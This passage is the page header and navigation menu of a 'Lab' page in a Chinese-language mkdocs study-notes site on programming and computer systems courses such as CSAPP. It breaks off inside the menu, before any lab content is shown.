<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link href=../%E5%86%85%E5%AD%98/ rel=prev><link href=../../Linux/Linux/ rel=next><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-9.5.49"><title>Lab - lingyu's notes</title><link rel=stylesheet href=../../assets/stylesheets/main.6f8fc17f.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.06af60db.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link rel=stylesheet href=../../css/timeline.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.7/katex.min.css><link rel=stylesheet href=../../mkdocs/css/no-footer.css><link rel=stylesheet href=../../mkdocs/css/unordered-list-symbols.css><link rel=stylesheet href=../../css/table.css><script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#lab class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../.. title="lingyu's notes" class="md-header__button md-logo" aria-label="lingyu's notes" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4zM3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7zm2-2v2h2V5zm0 14h2v-2H5zm0-6h2v-2H5z"/></svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> lingyu's notes </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Lab </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to light mode" type=radio name=__palette id=__palette_0> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=blue data-md-color-accent=blue aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_0 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg> </label> <nav class=md-search__options aria-label=查找> <button type=reset class="md-search__icon md-icon" title=清空当前内容 aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap tabindex=0 data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list role=presentation></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/lingyu11/notes/tree/master title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg> </div> <div class=md-source__repository> lingyu11/notes </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class=md-grid> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/01.%E5%88%9D%E8%AF%86Python/ class=md-tabs__link> Python </a> </li> <li class=md-tabs__item> <a href=../../%E8%AF%AD%E8%A8%80/C/C/ class=md-tabs__link> C </a> </li> <li class=md-tabs__item> <a href=../../%E8%AF%AD%E8%A8%80/Cpp/Cpp_primer/ class=md-tabs__link> C++ </a> </li> <li class=md-tabs__item> <a href=../../%E8%AF%AD%E8%A8%80/CS61A/CS61A_Lectures/ class=md-tabs__link> CS61A </a> </li> <li class=md-tabs__item> <a href=../../ICS/ICS_Lectures/ class=md-tabs__link> ICS </a> </li> <li class=md-tabs__item> <a href=../../%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%28%E4%B8%8A%29/ class=md-tabs__link> 计组 </a> </li> <li class=md-tabs__item> <a href=../../OS/%E7%BB%AA%E8%AE%BA/ class=md-tabs__link> OS </a> </li> <li class=md-tabs__item> <a href=../../DS_Algo/CS61B/CS61B/ class=md-tabs__link> 数据结构 </a> </li> <li class=md-tabs__item> <a href=../../DS_Algo/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E4%B8%8E%E5%8F%8C%E6%8C%87%E9%92%88/ class=md-tabs__link> 算法 </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href=../CH1/ class=md-tabs__link> CSAPP </a> </li> <li class=md-tabs__item> <a href=../../Linux/Linux/ class=md-tabs__link> Linux </a> </li> <li class=md-tabs__item> <a href=../../network.md class=md-tabs__link> 计算机网络 </a> </li> <li class=md-tabs__item> <a href=../../database.md class=md-tabs__link> 数据库 </a> </li> <li class=md-tabs__item> <a href=../../Tool/tool/ class=md-tabs__link> Tool </a> </li> <li class=md-tabs__item> <a href=../../Misc/Memo/ class=md-tabs__link> Misc </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title="lingyu's notes" class="md-nav__button md-logo" aria-label="lingyu's notes" data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4zM3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7zm2-2v2h2V5zm0 14h2v-2H5zm0-6h2v-2H5z"/></svg> </a> lingyu's notes </label> <div class=md-nav__source> <a href=https://github.com/lingyu11/notes/tree/master title=前往仓库 class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg> </div> <div class=md-source__repository> lingyu11/notes </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> <span class=md-ellipsis> Home </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2 id=__nav_2_label tabindex=0> <span class=md-ellipsis> Python </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_2_label aria-expanded=false> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Python </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_2_1> <label class=md-nav__link for=__nav_2_1 id=__nav_2_1_label tabindex=0> <span class=md-ellipsis> PythonBasic </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_1_label aria-expanded=false> <label class=md-nav__title for=__nav_2_1> <span class="md-nav__icon md-icon"></span> PythonBasic </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/01.%E5%88%9D%E8%AF%86Python/ class=md-nav__link> <span class=md-ellipsis> 01.初识Python </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/02.%E8%AF%AD%E8%A8%80%E5%85%83%E7%B4%A0/ class=md-nav__link> <span class=md-ellipsis> 02.语言元素 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/03.%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/ class=md-nav__link> <span class=md-ellipsis> 03.分支结构 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/04.%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/ class=md-nav__link> <span class=md-ellipsis> 04.循环结构 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/05.%E6%9E%84%E9%80%A0%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91/ class=md-nav__link> <span class=md-ellipsis> 05.构造程序逻辑 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/06.%E5%87%BD%E6%95%B0%E5%92%8C%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/ class=md-nav__link> <span class=md-ellipsis> 06.函数和模块的使用 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/07.%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/ class=md-nav__link> <span class=md-ellipsis> 07.字符串和常用数据结构 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/08.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/ class=md-nav__link> <span class=md-ellipsis> 08.面向对象编程基础 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/09.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%BF%9B%E9%98%B6/ class=md-nav__link> <span class=md-ellipsis> 09.面向对象进阶 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/10.%E5%9B%BE%E5%BD%A2%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2%E5%92%8C%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91/ class=md-nav__link> <span class=md-ellipsis> 10.图形用户界面和游戏开发 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/11.%E6%96%87%E4%BB%B6%E5%92%8C%E5%BC%82%E5%B8%B8/ class=md-nav__link> <span class=md-ellipsis> 11.文件和异常 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/12.%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/ class=md-nav__link> <span class=md-ellipsis> 12.字符串和正则表达式 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/13.%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/ class=md-nav__link> <span class=md-ellipsis> 13.进程和线程 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/14.%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8%E5%92%8C%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/ class=md-nav__link> <span class=md-ellipsis> 14.网络编程入门和网络应用开发 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/PythonBasic/15.%E5%9B%BE%E5%83%8F%E5%92%8C%E5%8A%9E%E5%85%AC%E6%96%87%E6%A1%A3%E5%A4%84%E7%90%86/ class=md-nav__link> <span class=md-ellipsis> 15.图像和办公文档处理 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2 id=__nav_2_2_label tabindex=0> <span class=md-ellipsis> Python进阶 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_2_label aria-expanded=false> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Python进阶 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/Python%E8%BF%9B%E9%98%B6/16.Python%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/ class=md-nav__link> <span class=md-ellipsis> 16.Python语言进阶 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_2_3> <label class=md-nav__link for=__nav_2_3 id=__nav_2_3_label tabindex=0> <span class=md-ellipsis> DataAnalysis </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=2 aria-labelledby=__nav_2_3_label aria-expanded=false> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> DataAnalysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/66.%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%A6%82%E8%BF%B0/ class=md-nav__link> <span class=md-ellipsis> 66.数据分析概述 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/67.%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/ class=md-nav__link> <span class=md-ellipsis> 67.环境准备 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/68.NumPy%E7%9A%84%E5%BA%94%E7%94%A8-1/ class=md-nav__link> <span class=md-ellipsis> 68.NumPy的应用 1 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/69.NumPy%E7%9A%84%E5%BA%94%E7%94%A8-2/ class=md-nav__link> <span class=md-ellipsis> 69.NumPy的应用 2 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/70.NumPy%E7%9A%84%E5%BA%94%E7%94%A8-3/ class=md-nav__link> <span class=md-ellipsis> 70.NumPy的应用 3 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/71.NumPy%E7%9A%84%E5%BA%94%E7%94%A8-4/ class=md-nav__link> <span class=md-ellipsis> 71.NumPy的应用 4 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/72.%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BApandas-1/ class=md-nav__link> <span class=md-ellipsis> 72.深入浅出pandas 1 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/73.%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BApandas-2/ class=md-nav__link> <span class=md-ellipsis> 73.深入浅出pandas 2 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/74.%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BApandas-3/ class=md-nav__link> <span class=md-ellipsis> 74.深入浅出pandas 3 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/75.%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BApandas-4/ class=md-nav__link> <span class=md-ellipsis> 75.深入浅出pandas 4 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/76.%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BApandas-5/ class=md-nav__link> <span class=md-ellipsis> 76.深入浅出pandas 5 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/77.%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BApandas-6/ class=md-nav__link> <span class=md-ellipsis> 77.深入浅出pandas 6 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/78.%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-1/ class=md-nav__link> <span class=md-ellipsis> 78.数据可视化 1 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/79.%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-2/ class=md-nav__link> <span class=md-ellipsis> 79.数据可视化 2 </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/Python-100-Days/DataAnalysis/80.%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-3/ class=md-nav__link> <span class=md-ellipsis> 80.数据可视化 3 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/PythonCookBook/ class=md-nav__link> <span class=md-ellipsis> Python Cook Book </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/PythonforDataAnalysis3E/ class=md-nav__link> <span class=md-ellipsis> Python for Data Analysis </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Python/PythonMisc/ class=md-nav__link> <span class=md-ellipsis> Python Misc </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/C/C/ class=md-nav__link> <span class=md-ellipsis> C </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4 id=__nav_4_label tabindex=0> <span class=md-ellipsis> C++ </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_4_label aria-expanded=false> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> C++ </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Cpp/Cpp_primer/ class=md-nav__link> <span class=md-ellipsis> C++ primer 5th edition </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/Cpp/Essential_Cpp/ class=md-nav__link> <span class=md-ellipsis> Essential C++ </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_5> <label class=md-nav__link for=__nav_5 id=__nav_5_label tabindex=0> <span class=md-ellipsis> CS61A </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_5_label aria-expanded=false> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> CS61A </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/CS61A/CS61A_Lectures/ class=md-nav__link> <span class=md-ellipsis> Lectures </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/CS61A/CS61A_HW/ class=md-nav__link> <span class=md-ellipsis> HW </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/CS61A/CS61A_Lab/ class=md-nav__link> <span class=md-ellipsis> Lab </span> </a> </li> <li class=md-nav__item> <a href=../../%E8%AF%AD%E8%A8%80/CS61A/CS61A_Project/ class=md-nav__link> <span class=md-ellipsis> Project </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_6> <label class=md-nav__link for=__nav_6 id=__nav_6_label tabindex=0> <span class=md-ellipsis> ICS </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_6_label aria-expanded=false> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> ICS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../ICS/ICS_Lectures/ class=md-nav__link> <span class=md-ellipsis> Lectures </span> </a> </li> <li class=md-nav__item> <a href=../../ICS/ICS_Lab/ class=md-nav__link> <span class=md-ellipsis> Lab </span> </a> </li> <li class=md-nav__item> <a href=../../ICS/%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A1%A8%E7%A4%BA%E8%BD%AC%E6%8D%A2%E4%B8%8E%E9%93%BE%E6%8E%A5/ class=md-nav__link> <span class=md-ellipsis> 程序的表示、转换与链接 </span> </a> </li> <li class=md-nav__item> <a href=../../ICS/%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E5%92%8C%E5%AD%98%E5%82%A8%E8%AE%BF%E9%97%AE/ class=md-nav__link> <span class=md-ellipsis> 程序的执行和存储访问 </span> </a> </li> <li class=md-nav__item> <a href=../../ICS/%E5%BC%82%E5%B8%B8%E3%80%81%E4%B8%AD%E6%96%AD%E5%92%8C%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/ class=md-nav__link> <span class=md-ellipsis> 异常、中断和输入/输出 </span> </a> </li> <li class=md-nav__item> <a href=../../ICS/%E7%BC%96%E7%A8%8B%E4%B8%8E%E8%B0%83%E8%AF%95%E5%AE%9E%E8%B7%B5/ class=md-nav__link> <span class=md-ellipsis> 编程与调试实践 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_7> <label class=md-nav__link for=__nav_7 id=__nav_7_label tabindex=0> <span class=md-ellipsis> 计组 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_7_label aria-expanded=false> <label class=md-nav__title for=__nav_7> <span class="md-nav__icon md-icon"></span> 计组 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../%E8%AE%A1%E7%BB%84/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%28%E4%B8%8A%29/ class=md-nav__link> <span class=md-ellipsis> 计算机组成原理(上) </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_8> <label class=md-nav__link for=__nav_8 id=__nav_8_label tabindex=0> <span class=md-ellipsis> OS </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_8_label aria-expanded=false> <label class=md-nav__title for=__nav_8> <span class="md-nav__icon md-icon"></span> OS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../OS/%E7%BB%AA%E8%AE%BA/ class=md-nav__link> <span class=md-ellipsis> 绪论 </span> </a> </li> <li class=md-nav__item> <a href=../../OS/%E5%B9%B6%E5%8F%91/ class=md-nav__link> <span class=md-ellipsis> 并发 </span> </a> </li> <li class=md-nav__item> <a 